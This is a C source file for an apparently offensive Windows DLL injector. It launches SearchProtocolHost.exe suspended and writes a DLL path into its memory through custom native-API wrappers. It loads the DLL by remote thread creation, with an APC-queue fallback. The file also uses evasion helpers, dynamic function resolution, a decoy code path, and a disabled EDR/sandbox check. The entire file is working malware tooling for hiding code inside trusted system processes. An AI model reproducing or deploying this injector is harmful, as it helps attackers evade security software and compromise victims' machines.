#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "detector.h"
#include "evasion.h"
#include <winternl.h>
#include <tlhelp32.h>

typedef NTSTATUS(NTAPI *pNtQueueApcThread)(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3);

BOOL QueueAPCInjection(HANDLE hProcess, LPVOID remoteDllPath, LPTHREAD_START_ROUTINE loadLibraryAddr)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        printf("[!] Failed to create snapshot.\n");
        return FALSE;
    }

    THREADENTRY32 te;
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te))
    {
        do
        {
            if (te.th32OwnerProcessID == GetProcessId(hProcess))
            {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                if (hThread)
                {
                    printf("[*] Found Thread ID: %lu\n", te.th32ThreadID);

                    // Resolve NtQueueApcThread dynamically
                    pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetMod("ntdll.dll", "NtQueueApcThread");
                    if (NtQueueApcThread)
                    {
                        NTSTATUS status = NtQueueApcThread(hThread, (PVOID)loadLibraryAddr, remoteDllPath, NULL, NULL);
                        if (status == 0)
                        {
                            ResumeThread(hThread);
                            CloseHandle(hThread);
                            CloseHandle(hSnapshot);
                            return TRUE;
                        } else {
                            printf("[!] NtQueueApcThread failed: 0x%lX\n", status);
                        }
                    } else {
                        printf("[!] Failed to resolve NtQueueApcThread.\n");
                    }
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
    return FALSE;
}

// Core Injection Logic
void StealthExec(HANDLE hProc, const char *dllN)
{
    PVOID memLoc = NULL;
    SIZE_T sz = strlen(dllN) + 1;
    HANDLE hThreadRemote;
    NTSTATUS status;

    // Resolve Required Functions
    pMod pLLoad = GetMod("kernel32.dll", "LoadLibraryA");

    if (!pLLoad)
    {
        printf("[!] Failed to resolve LoadLibraryA.\n");
        return;
    }
    else
    {
        printf("[*] Successfully resolve LoadLibraryA.\n");
    }

    status = CustAVM(hProc, &memLoc, 0, &sz, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
    if (status != 0)
    {
        printf("[!] NtAllocateVirtualMemory failed! Status: 0x%lX\n", status);
        return;
    }

    if (memLoc == NULL)
    {
        printf("[!] Memory allocation failed, BaseAddress is NULL.\n");
        return;
    }
    else
    {
        printf("[*] Successfully allocate memory.\n");
    }

    // Write DLL Path to Remote Process
    status = CustWVM(hProc, memLoc, (PVOID)dllN, (ULONG)sz, NULL);
    if (status != 0)
    {
        printf("[!] Memory write failed (Err: 0x%lX).\n", status);
        return;
    }
    else
    {
        printf("[*] Successfully write memory.\n");
    }

    // Load Remote DLL
    hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
    if (!hThreadRemote)
    {
        printf("[!] Thread creation failed. Err: %lu\n", GetLastError());
        printf("[*] Injecting using APC Queue\n");
        if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
        {
            printf("[!] APC Injection failed.\n");
        }
        else
        {
            printf("[*] Successfully injected via APC!\n");
        }
        return;
    }
    else
    {
        printf("[*] Thread creation succeed. Waiting for thread to resume\n");
        DWORD waitResult = WaitForSingleObject(hThreadRemote, 10000); // Wait for 10 seconds
        if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
        {
            printf("[!] WaitForSingleObject failed! Error: %lu\n", GetLastError());
            CloseHandle(hThreadRemote);
            TerminateThread(hThreadRemote, 0); // Kill stuck thread
            printf("[*] Injecting using APC Queue\n");
            if (!QueueAPCInjection(hProc, memLoc, (LPTHREAD_START_ROUTINE)pLLoad))
            {
                printf("[!] APC Injection failed.\n");
            }
            else
            {
                printf("[*] Successfully injected via APC!\n");
            }
            return;
        }
        ResumeThread(hThreadRemote);
        CloseHandle(hThreadRemote);
        printf("[*] Successfully injected module via RemoteThread\n");
    }
    return;
}

// Entry Function
int main(int argc, char *argv[])
{
    // Check For EDR/AV/Sandbox env
    // if (PerfomChecksEnv())
    // {
    //     return 0;
    // }

    // If no DLL given, abort.
    if (argc != 2)
    {
        SortNumbers();
        return 0;
    }

    const char *dllPath = argv[1];

    STARTUPINFOA sInfo = {0};
    PROCESS_INFORMATION pInfo = {0};

    const char *procPath = "C:\\Windows\\System32\\SearchProtocolHost.exe";
    const char *procName = "SearchProtocolHost.exe";
    // Also work with explorer.exe
    // const char* procPath = "C:\\Windows\\explorer.exe";
    // const char *procName = "Explorer.exe";

    if (!CreateProcessA(procPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &sInfo, &pInfo))
    {
        printf("[!] Could not create %s. Err: %lu\n", procName, GetLastError());
        return -1;
    }

    printf("[*] Suspended %s created.\n", procName);

    // Perform Injection
    StealthExec(pInfo.hProcess, dllPath);

    // Resume Execution
    CloseHandle(pInfo.hProcess);
    printf("[*] %s is now running.\n", procName);

    return 0;
}